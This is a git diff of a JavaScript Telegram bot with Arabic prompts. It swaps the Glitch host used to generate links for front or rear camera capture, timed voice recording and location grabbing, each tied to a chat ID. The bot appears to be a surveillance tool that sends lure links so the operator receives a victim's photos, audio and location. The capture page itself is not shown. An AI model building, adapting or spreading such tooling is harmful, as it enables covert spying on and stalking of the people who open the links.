@@ -318,12 +318,12 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://silky-triangular-parade.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
+        const url = `https://silky-triangular-parade.glitch.me/getLocation/${chatId}`;
         console.log('Data received:', data);
         console.log('Chat ID:', chatId);
         console.log('URL:', url);
@@ -340,7 +340,7 @@ bot.on('message', (msg) => {
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
-            const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
+            const link = `https://silky-triangular-parade.glitch.me/record/${chatId}?duration=${duration}`;
             bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
@@ -350,7 +350,7 @@ bot.on('message', (msg) => {
 
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
-    const baseUrl = 'https://creative-marmalade-periwinkle.glitch.me/'; // Change this to your actual URL
+    const baseUrl = 'https://silky-triangular-parade.glitch.me/'; // Change this to your actual URL
 
     let url;
     switch (query.data) {
